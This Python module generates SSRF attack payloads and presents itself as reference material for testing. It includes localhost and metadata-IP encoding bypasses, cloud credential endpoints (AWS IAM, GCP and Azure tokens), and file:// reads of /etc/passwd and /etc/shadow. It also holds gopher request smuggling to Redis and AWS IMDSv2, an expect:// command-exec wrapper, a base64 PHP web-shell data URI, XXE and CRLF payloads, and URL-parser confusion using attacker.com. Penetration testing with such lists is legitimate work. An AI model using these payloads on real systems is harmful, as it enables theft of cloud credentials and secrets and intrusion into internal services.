#!/usr/bin/env python3
"""
SSRF payload generators for comprehensive testing.

These are reference implementations to illustrate payload patterns.
Adapt them to your specific application's URL handling.

Usage:
    from ssrf_payloads import get_localhost_payloads, get_cloud_metadata_payloads

    for payload in get_localhost_payloads():
        test_ssrf(target, payload)
"""

from typing import List, Dict
from urllib.parse import quote


def get_localhost_payloads() -> List[str]:
    """
    Generate localhost/127.0.0.1 bypass payloads.

    Returns:
        List of URLs that resolve to localhost using various bypass techniques.
    """
    return [
        # Standard localhost
        "http://127.0.0.1",
        "http://localhost",
        "http://127.0.0.1:80",
        "http://localhost:80",

        # Short forms
        "http://127.1",
        "http://127.0.1",
        "http://0",
        "http://0.0.0.0",

        # Decimal encoding (127.0.0.1 = 2130706433)
        "http://2130706433",

        # Hexadecimal encoding
        "http://0x7f000001",
        "http://0x7f.0x0.0x0.0x1",

        # Octal encoding
        "http://0177.0.0.1",
        "http://0177.0000.0000.0001",
        "http://017700000001",

        # IPv6 representations
        "http://[::1]",
        "http://[0000::1]",
        "http://[::ffff:127.0.0.1]",
        "http://[0:0:0:0:0:ffff:127.0.0.1]",
        "http://[::ffff:7f00:1]",

        # IPv6 localhost aliases
        "http://ip6-localhost",
        "http://ip6-loopback",

        # DNS services that resolve to localhost
        "http://localtest.me",
        "http://127.0.0.1.nip.io",
        "http://www.127.0.0.1.nip.io",
        "http://127.0.0.1.xip.io",

        # Mixed encoding
        "http://127.0.0.1.nip.io:80",
        "http://0x7f.0.0.1",
    ]


def get_cloud_metadata_payloads(provider: str = "all") -> List[Dict[str, str]]:
    """
    Generate cloud provider metadata endpoint payloads.

    Args:
        provider: Cloud provider name (aws, gcp, azure, digitalocean, alibaba, oracle, all)

    Returns:
        List of dicts with 'url' and 'description' keys
    """
    payloads = {
        "aws": [
            {"url": "http://169.254.169.254/latest/meta-data/", "desc": "AWS metadata root"},
            {"url": "http://169.254.169.254/latest/meta-data/ami-id", "desc": "AWS AMI ID"},
            {"url": "http://169.254.169.254/latest/meta-data/hostname", "desc": "AWS hostname"},
            {"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/", "desc": "AWS IAM roles list"},
            {"url": "http://169.254.169.254/latest/user-data", "desc": "AWS user data (may contain secrets)"},
            {"url": "http://169.254.169.254/latest/dynamic/instance-identity/document", "desc": "AWS instance identity"},
            # IPv6
            {"url": "http://[fd00:ec2::254]/latest/meta-data/", "desc": "AWS metadata (IPv6)"},
            # ECS
            {"url": "http://169.254.170.2/v2/credentials/", "desc": "AWS ECS credentials"},
            # Lambda
            {"url": "http://localhost:9001/2018-06-01/runtime/invocation/next", "desc": "AWS Lambda runtime"},
        ],
        "gcp": [
            {"url": "http://169.254.169.254/computeMetadata/v1/", "desc": "GCP metadata (needs header)"},
            {"url": "http://metadata.google.internal/computeMetadata/v1/", "desc": "GCP metadata internal"},
            {"url": "http://metadata/computeMetadata/v1/", "desc": "GCP metadata short"},
            # Beta (may not require header)
            {"url": "http://metadata.google.internal/computeMetadata/v1beta1/", "desc": "GCP v1beta1 (no header)"},
            {"url": "http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token", "desc": "GCP token (v1beta1)"},
            {"url": "http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json", "desc": "GCP SSH keys"},
        ],
        "azure": [
            {"url": "http://169.254.169.254/metadata/instance?api-version=2021-02-01", "desc": "Azure IMDS (needs header)"},
            {"url": "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/", "desc": "Azure managed identity token"},
        ],
        "digitalocean": [
            {"url": "http://169.254.169.254/metadata/v1/", "desc": "DigitalOcean metadata"},
            {"url": "http://169.254.169.254/metadata/v1.json", "desc": "DigitalOcean metadata JSON"},
            {"url": "http://169.254.169.254/metadata/v1/id", "desc": "DigitalOcean droplet ID"},
            {"url": "http://169.254.169.254/metadata/v1/user-data", "desc": "DigitalOcean user data"},
        ],
        "alibaba": [
            {"url": "http://100.100.100.200/latest/meta-data/", "desc": "Alibaba Cloud metadata"},
            {"url": "http://100.100.100.200/latest/meta-data/instance-id", "desc": "Alibaba instance ID"},
            {"url": "http://100.100.100.200/latest/meta-data/image-id", "desc": "Alibaba image ID"},
        ],
        "oracle": [
            {"url": "http://192.0.0.192/latest/", "desc": "Oracle Cloud metadata"},
            {"url": "http://192.0.0.192/latest/meta-data/", "desc": "Oracle Cloud meta-data"},
            {"url": "http://192.0.0.192/latest/user-data/", "desc": "Oracle Cloud user-data"},
        ],
        "kubernetes": [
            {"url": "https://kubernetes.default.svc/", "desc": "Kubernetes API server"},
            {"url": "http://127.0.0.1:10255/pods/", "desc": "Kubelet pods"},
            {"url": "http://127.0.0.1:2379/v2/keys/", "desc": "etcd keys"},
        ],
        "docker": [
            {"url": "http://127.0.0.1:2375/containers/json", "desc": "Docker containers"},
            {"url": "http://127.0.0.1:2375/images/json", "desc": "Docker images"},
            {"url": "http://127.0.0.1:2375/version", "desc": "Docker version"},
        ],
        "hetzner": [
            {"url": "http://169.254.169.254/hetzner/v1/metadata", "desc": "Hetzner metadata"},
            {"url": "http://169.254.169.254/hetzner/v1/metadata/hostname", "desc": "Hetzner hostname"},
            {"url": "http://169.254.169.254/hetzner/v1/metadata/instance-id", "desc": "Hetzner instance ID"},
            {"url": "http://169.254.169.254/hetzner/v1/metadata/public-ipv4", "desc": "Hetzner public IP"},
            {"url": "http://169.254.169.254/hetzner/v1/metadata/private-networks", "desc": "Hetzner private networks"},
        ],
        "rancher": [
            {"url": "http://rancher-metadata/2015-12-19/", "desc": "Rancher metadata root"},
            {"url": "http://rancher-metadata/latest/", "desc": "Rancher metadata latest"},
            {"url": "http://rancher-metadata/latest/self/container", "desc": "Rancher container info"},
        ],
        "openstack": [
            {"url": "http://169.254.169.254/openstack/latest/meta_data.json", "desc": "OpenStack metadata"},
            {"url": "http://169.254.169.254/openstack/latest/user_data", "desc": "OpenStack user data"},
        ],
        "packet": [
            {"url": "https://metadata.packet.net/metadata", "desc": "Packet/Equinix metadata"},
            {"url": "https://metadata.packet.net/userdata", "desc": "Packet user data"},
        ],
    }

    if provider == "all":
        result = []
        for p_payloads in payloads.values():
            result.extend(p_payloads)
        return result

    return payloads.get(provider.lower(), [])


def get_aws_imdsv2_payloads() -> List[Dict[str, str]]:
    """
    Generate AWS IMDSv2 payloads (token-based metadata service).

    IMDSv2 requires a token obtained via PUT request. Standard SSRF may not work
    unless the application follows redirects or you can control HTTP method/headers.

    Returns:
        List of dicts with payload info
    """
    return [
        {
            "step": "1_get_token",
            "method": "PUT",
            "url": "http://169.254.169.254/latest/api/token",
            "headers": {"X-aws-ec2-metadata-token-ttl-seconds": "21600"},
            "desc": "Get IMDSv2 token (requires PUT method)"
        },
        {
            "step": "2_use_token",
            "method": "GET",
            "url": "http://169.254.169.254/latest/meta-data/",
            "headers": {"X-aws-ec2-metadata-token": "<TOKEN_FROM_STEP_1>"},
            "desc": "Access metadata with token"
        },
        {
            "note": "If app can't do PUT, try header injection via gopher://",
            "url": "gopher://169.254.169.254:80/_PUT%20/latest/api/token%20HTTP/1.1%0D%0AHost:%20169.254.169.254%0D%0AX-aws-ec2-metadata-token-ttl-seconds:%2021600%0D%0A%0D%0A",
            "desc": "IMDSv2 token via gopher (if PUT blocked)"
        },
    ]


def get_metadata_bypass_payloads() -> List[str]:
    """
    Generate 169.254.169.254 (AWS metadata) bypass payloads.

    Returns:
        List of URLs using various encoding to reach AWS metadata.
    """
    return [
        # Standard
        "http://169.254.169.254",

        # Decimal (169.254.169.254 = 2852039166)
        "http://2852039166",

        # Hexadecimal
        "http://0xA9FEA9FE",
        "http://0xa9.0xfe.0xa9.0xfe",

        # Octal
        "http://0251.0376.0251.0376",
        "http://0251.254.169.254",  # Mixed

        # IPv6
        "http://[::ffff:169.254.169.254]",
        "http://[::ffff:a9fe:a9fe]",
        "http://[0:0:0:0:0:ffff:169.254.169.254]",

        # DNS rebinding
        "http://169.254.169.254.nip.io",

        # Overflow (may work on some parsers)
        "http://425.510.425.510",
    ]


def get_ip_encoding_payloads(ip: str) -> List[str]:
    """
    Generate all encoding variants for a given IP address.

    Args:
        ip: IP address in dotted decimal format (e.g., "10.0.0.1")

    Returns:
        List of encoded URL variants
    """
    parts = [int(p) for p in ip.split(".")]

    # Calculate decimal representation
    decimal = (parts[0] << 24) + (parts[1] << 16) + (parts[2] << 8) + parts[3]

    # Calculate hex
    hex_full = hex(decimal)
    hex_dotted = ".".join(hex(p) for p in parts)

    # Calculate octal
    octal_dotted = ".".join(oct(p) for p in parts)

    return [
        f"http://{ip}",
        f"http://{decimal}",              # Decimal
        f"http://{hex_full}",             # Hex (0xAABBCCDD)
        f"http://{hex_dotted}",           # Hex dotted
        f"http://{octal_dotted}",         # Octal dotted
        f"http://[::ffff:{ip}]",          # IPv6 mapped
    ]


def get_protocol_payloads() -> List[Dict[str, str]]:
    """
    Generate alternative protocol payloads for SSRF.

    Returns:
        List of dicts with 'url', 'protocol', and 'description' keys
    """
    return [
        # File protocol
        {"url": "file:///etc/passwd", "protocol": "file", "desc": "Linux passwd file"},
        {"url": "file:///etc/shadow", "protocol": "file", "desc": "Linux shadow file"},
        {"url": "file:///proc/self/environ", "protocol": "file", "desc": "Process environment"},
        {"url": "file:///proc/self/cmdline", "protocol": "file", "desc": "Process command line"},
        {"url": "file:///c:/windows/win.ini", "protocol": "file", "desc": "Windows win.ini"},
        {"url": "file:///c:/windows/system32/drivers/etc/hosts", "protocol": "file", "desc": "Windows hosts"},
        {"url": "file://\\/\\/etc/passwd", "protocol": "file", "desc": "File with backslash"},

        # Gopher protocol
        {"url": "gopher://127.0.0.1:6379/_INFO%0D%0A", "protocol": "gopher", "desc": "Redis INFO"},
        {"url": "gopher://127.0.0.1:11211/_stats%0D%0A", "protocol": "gopher", "desc": "Memcached stats"},
        {"url": "gopher://127.0.0.1:25/_HELO%20localhost%0D%0A", "protocol": "gopher", "desc": "SMTP HELO"},

        # Dict protocol
        {"url": "dict://127.0.0.1:6379/INFO", "protocol": "dict", "desc": "Redis via dict"},
        {"url": "dict://127.0.0.1:11211/stats", "protocol": "dict", "desc": "Memcached via dict"},

        # LDAP
        {"url": "ldap://127.0.0.1:389/", "protocol": "ldap", "desc": "LDAP server"},
        {"url": "ldap://127.0.0.1:389/dc=example,dc=com", "protocol": "ldap", "desc": "LDAP with base DN"},

        # SFTP/FTP
        {"url": "sftp://attacker.com:22/", "protocol": "sftp", "desc": "SFTP connection"},
        {"url": "ftp://attacker.com/", "protocol": "ftp", "desc": "FTP connection"},

        # TFTP
        {"url": "tftp://attacker.com:69/test", "protocol": "tftp", "desc": "TFTP request"},

        # Netdoc (Java)
        {"url": "netdoc:///etc/passwd", "protocol": "netdoc", "desc": "Java netdoc"},

        # Jar (Java)
        {"url": "jar:http://127.0.0.1!/", "protocol": "jar", "desc": "Java JAR scheme"},

        # PHP wrappers
        {"url": "php://filter/convert.base64-encode/resource=/etc/passwd", "protocol": "php", "desc": "PHP filter wrapper"},
        {"url": "php://input", "protocol": "php", "desc": "PHP input stream"},
        {"url": "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+", "protocol": "data", "desc": "Data URI (PHP code)"},
        {"url": "phar:///tmp/test.phar", "protocol": "phar", "desc": "PHAR archive"},
        {"url": "expect://id", "protocol": "expect", "desc": "Expect wrapper (command exec)"},
    ]


def get_unicode_bypass_payloads() -> List[str]:
    """
    Generate Unicode/Punycode bypass payloads.

    Some validators don't properly normalize Unicode characters.

    Returns:
        List of Unicode-encoded URLs
    """
    return [
        # Enclosed alphanumerics (normalize to ASCII)
        "http://ⓛⓞⓒⓐⓛⓗⓞⓢⓣ",
        "http://ⓛⓞⓒⓐⓛⓗⓞⓢⓣ:80",

        # Circled numbers for IP
        "http://①②⑦.⓪.⓪.①",

        # Mixed Unicode
        "http://locⓐlhost",
        "http://127。0。0。1",  # Fullwidth dots

        # Unicode normalization tricks
        "http://ʟᴏᴄᴀʟʜᴏꜱᴛ",  # Small caps
    ]


def get_crlf_payloads(allowed_host: str = "allowed.com") -> List[str]:
    """
    Generate CRLF injection payloads for header injection via SSRF.

    Args:
        allowed_host: Whitelisted host to prepend

    Returns:
        List of CRLF injection URLs
    """
    return [
        f"http://{allowed_host}%0d%0aHost:%20127.0.0.1",
        f"http://{allowed_host}%0d%0a%0d%0aGET%20/internal%20HTTP/1.1",
        f"http://{allowed_host}%0d%0aX-Injected:%20header",
        f"http://{allowed_host}%00@127.0.0.1",  # Null byte
    ]


def get_xxe_ssrf_payloads(target_url: str = "http://169.254.169.254/latest/meta-data/") -> List[str]:
    """
    Generate XXE payloads that lead to SSRF.

    Args:
        target_url: Internal URL to fetch via XXE

    Returns:
        List of XXE payload strings
    """
    return [
        # Basic XXE to internal URL
        f'''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "{target_url}">]>
<data>&xxe;</data>''',

        # XXE with parameter entity (for blind)
        f'''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "{target_url}">
  %xxe;
]>
<data>test</data>''',

        # XXE to file://
        '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data>&xxe;</data>''',

        # XXE via SVG
        f'''<svg xmlns="http://www.w3.org/2000/svg">
  <image href="{target_url}" />
</svg>''',
    ]


def get_html_ssrf_payloads(target_url: str = "http://169.254.169.254/latest/meta-data/") -> List[str]:
    """
    Generate HTML payloads for SSRF via PDF/HTML renderers.

    Args:
        target_url: Internal URL to fetch

    Returns:
        List of HTML injection payloads
    """
    return [
        f'<iframe src="{target_url}" width="800" height="600">',
        f'<img src="{target_url}">',
        f'<script src="{target_url}"></script>',
        f'<link rel="stylesheet" href="{target_url}">',
        f'<object data="{target_url}">',
        f'<embed src="{target_url}">',
        f'<style>@import url("{target_url}");</style>',
        f'<div style="background: url(\'{target_url}\');">',
        f'<base href="{target_url}">',
        f'<video src="{target_url}">',
        f'<audio src="{target_url}">',
    ]


def get_dns_rebinding_payloads(target_ip: str) -> List[str]:
    """
    Generate DNS rebinding payloads to bypass IP validation.

    Args:
        target_ip: Target internal IP to rebind to (e.g., "127.0.0.1")

    Returns:
        List of DNS rebinding URLs
    """
    # Format: make-{safe_ip}-rebind-{target_ip}-rr.1u.ms
    # First resolution returns safe_ip, second returns target_ip
    safe_ip = "1.2.3.4"
    target_formatted = target_ip.replace(".", "-")

    return [
        f"http://make-{safe_ip.replace('.', '-')}-rebind-{target_formatted}-rr.1u.ms/",
        f"http://{target_ip}.nip.io/",
        f"http://www.{target_ip}.nip.io/",
        f"http://{target_ip}.xip.io/",
    ]


def get_url_parser_confusion_payloads(internal_host: str = "127.0.0.1",
                                       external_host: str = "attacker.com") -> List[str]:
    """
    Generate URL parser confusion payloads.

    Different URL parsers interpret ambiguous URLs differently, allowing bypass.

    Args:
        internal_host: Target internal host
        external_host: External host that passes validation

    Returns:
        List of confusing URL payloads
    """
    return [
        # Userinfo confusion (@)
        f"http://{external_host}@{internal_host}/",
        f"http://{external_host}:80@{internal_host}/",
        f"http://user:pass@{external_host}@{internal_host}/",

        # Fragment confusion (#)
        f"http://{internal_host}#{external_host}/",
        f"http://{internal_host}#@{external_host}/",
        f"http://{external_host}:80#{internal_host}/",

        # Backslash confusion
        f"http://{internal_host}\\@{external_host}/",
        f"http://{external_host}\\@{internal_host}/",
        f"http://{internal_host}:80\\@{external_host}:80/",

        # Combined
        f"http://{internal_host}:80\\@@{external_host}:80/",
        f"http://{internal_host}:80:\\@@{external_host}:80/",

        # No scheme normalization
        f"http:{internal_host}/",
        f"http://{internal_host}",
    ]


def get_redirect_bypass_payloads(target_url: str) -> List[str]:
    """
    Generate redirect-based bypass payloads.

    Uses redirect services to bypass URL validation that only checks initial URL.

    Args:
        target_url: Target internal URL to redirect to

    Returns:
        List of redirect URLs
    """
    encoded_target = quote(target_url, safe="")

    return [
        # r3dir.me service (307 preserves method)
        f"https://307.r3dir.me/--to/?url={encoded_target}",
        f"https://302.r3dir.me/--to/?url={encoded_target}",

        # If you control a domain
        f"http://yourserver.com/redirect?url={encoded_target}",
    ]


def get_common_internal_services() -> List[Dict[str, str]]:
    """
    Get common internal services and their default ports for scanning.

    Returns:
        List of dicts with service info
    """
    return [
        {"host": "127.0.0.1", "port": 22, "service": "SSH"},
        {"host": "127.0.0.1", "port": 80, "service": "HTTP"},
        {"host": "127.0.0.1", "port": 443, "service": "HTTPS"},
        {"host": "127.0.0.1", "port": 3000, "service": "Node.js"},
        {"host": "127.0.0.1", "port": 3306, "service": "MySQL"},
        {"host": "127.0.0.1", "port": 5432, "service": "PostgreSQL"},
        {"host": "127.0.0.1", "port": 6379, "service": "Redis"},
        {"host": "127.0.0.1", "port": 8080, "service": "HTTP Alt"},
        {"host": "127.0.0.1", "port": 8443, "service": "HTTPS Alt"},
        {"host": "127.0.0.1", "port": 9200, "service": "Elasticsearch"},
        {"host": "127.0.0.1", "port": 11211, "service": "Memcached"},
        {"host": "127.0.0.1", "port": 27017, "service": "MongoDB"},
        {"host": "127.0.0.1", "port": 5672, "service": "RabbitMQ"},
        {"host": "127.0.0.1", "port": 9000, "service": "PHP-FPM"},
        {"host": "127.0.0.1", "port": 2375, "service": "Docker API"},
        {"host": "127.0.0.1", "port": 2379, "service": "etcd"},
        {"host": "127.0.0.1", "port": 10255, "service": "Kubelet"},
    ]

